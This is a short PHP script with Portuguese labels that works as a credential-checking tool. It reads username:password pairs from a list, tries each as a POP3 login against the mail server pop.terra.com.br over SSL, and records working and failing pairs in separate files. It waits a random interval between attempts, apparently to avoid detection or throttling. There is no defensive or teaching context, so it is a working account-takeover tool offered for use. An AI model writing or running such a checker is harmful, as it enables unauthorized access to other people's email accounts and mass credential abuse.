<?php
function pop3authCheck($username, $password, $address, $ssl){

	if ($ssl)

		$uri="ssl://$address:995";

	else

		$uri="tcp://$address:110";



	$fp=fsockopen($uri);



	if (!$fp)

		return(NULL);



	$st=fgets($fp, 512);

	if (substr($st, 0, 3)!="+OK")

	{

		fclose($fp);

		return(NULL);

	}



	$st="USER $username\n";

	if (fwrite($fp, $st)!=strlen($st))

	{

		fclose($fp);

		return(NULL);

	}



	$st=fgets($fp, 512);

	if (substr($st, 0, 3)!="+OK")

	{

		fclose($fp);

		return(NULL);

	}



	$st="PASS $password\n";

	if (fwrite($fp, $st)!=strlen($st))

	{

		fclose($fp);

		return(NULL);

	}



	$st=fgets($fp, 512);
	        echo "$st";
	fclose($fp);

	if (substr($st, 0, 3)=="+OK")

		return(true);

	else if (substr($st, 0, 4)=="+ERR")

		return(false);

	else

		return(NULL);

}

$linha ="listaterraprateste.txt";
$arquivoleitura = fopen($linha,"r");
$i = 1;
$e = 0;
$a = 0;
	    while(!feof($arquivoleitura)){
       	        $errors = "";
                $linhalet = fgets($arquivoleitura, 4096);
		$linhalet = trim($linhalet);
                $dados = explode(":", $linhalet);
//              $mailserver = ""; //aqui altera pro servidor que vai testar
                $username = $dados[0];
                $password = $dados[1];
   	        $address ='pop.terra.com.br';
  	        $ssl ='S';
	        $resultado = pop3authCheck($username, $password, $address, $ssl);

	if ($resultado){
		$a++;
		echo"$username;$password OK  = $i logins $a certos e $e errados\n";
		$arquivobom = fopen("bomterra.txt","a+");
                $salvar = fwrite($arquivobom, "$username;$password".PHP_EOL);
	}
	else{
		$e++;
		echo "$username;$password ERRADO  = $i logins $a certos e $e errados\n";
        	$arquivoerro = fopen("ruimterra.txt","a+");
               $salvar = fwrite($arquivoerro, "$username;$password".PHP_EOL);

	}
	$tempo=rand(1,8);
$i++;
sleep($tempo);

}

?>
